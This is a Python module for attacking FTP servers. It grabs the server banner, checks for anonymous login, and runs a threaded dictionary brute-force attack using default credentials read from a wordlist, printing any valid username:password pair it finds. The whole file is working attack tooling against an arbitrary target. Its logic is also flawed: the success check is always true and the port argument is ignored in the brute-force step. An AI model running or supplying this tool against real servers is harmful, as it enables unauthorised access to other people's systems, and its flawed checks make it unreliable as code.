from colorama import Fore, Back , Style
import sys, os
import threading, time
import ftplib



thres_=0
fd=0
def checkconn(target,port):
    if (port!=21): 
        try:
            ftp=ftplib.FTP(target,)
            ftp.connect(host=target,port=port, timeout=5)
        except:
            return False
    else:
        try:
            ftp=ftplib.FTP(target, timeout=5)
        except :
            return False
    return True

def anoncheck(target):
    ftp=ftplib.FTP(target)
    response=str(ftp.login())
    if ("success" or "Sucess" or "SUCCESS" or "230" in response):
        return True
    return False

def bannerinfo(target):
    ftp=ftplib.FTP(target)
    return (str(ftp.getwelcome()))

def brute(target,port,user,password):
        global thres_
        global fd
        try:
            ftp=ftplib.FTP(target)
            response=str(ftp.login(user=user, passwd=password))
            if ("success" or "Sucess" or "SUCCESS" or "230" in response):
                print(Fore.GREEN+"--|* Found valid login "+user+":"+password+Fore.RESET)
                thres_ = 1
                fd=1
                ftp.quit()

        except KeyboardInterrupt:
            print("\n"+Back.RED+"--|! CTRL-C! exiting"+Back.RESET)
            exit()
        except:
            if (fd!=1):
                print(Fore.CYAN+"--|i Trying "+user+":"+password+Fore.RESET, end='\r')                

def ftpc(target,port,inl):
    print(Back.WHITE+Fore.RED+Style.BRIGHT+"--|0 Starting Ftp Module 0|--"+Back.RESET+Fore.RESET)
    print(Fore.CYAN+"--|i "+str(bannerinfo(target))+Fore.RESET)
    
    if anoncheck(target)==True:
        print(Fore.GREEN+Style.BRIGHT+"--|* Anonymous login is enabled on "+target+Fore.RESET)
    if (inl==2):
        print(Fore.CYAN+"--|i Starting Threaded Dictionary attack on "+target+Fore.RESET)
        
        usernames=[]
        passwords=[""]
        with open("docs/seclists-default.txt", "r") as wl:
            for line in wl: 
                lline=line.split(":",1)[0]
                if (lline!="anonymous"): usernames.append(lline)
                llline=line[len(lline)+1:-1]
                passwords.append(llline)
        
        for user in usernames:
            for password in passwords:
                if thres_ == 1:
                    t.join()
                    break        
                tc=str(threading.active_count())
                t = threading.Thread(target=brute, args=(target,port,user,password))
                t.start()
                time.sleep(0.1)
    
    print(Fore.RED+Style.BRIGHT+"--|1 Ftp Module Finished!1|--"+Fore.RESET)

